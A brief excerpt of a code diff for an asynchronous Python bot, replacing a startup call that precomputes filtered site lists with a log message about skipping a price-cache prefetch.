-            # FIX: Precompute filtered site lists on startup for instant amount filtering
-            self.precompute_filtered_sites()
+                logger.info(f"[startup] Price cache already full ({len(sites)} sites), skipping prefetch")
         await self.run_with_reconnect()
 
 
@@ -4974,5 +4179,4 @@ if __name__ == "__main__":
         asyncio.run(bot.run())
     except KeyboardInterrupt:
         logger.info("Shutdown.")
-
                     
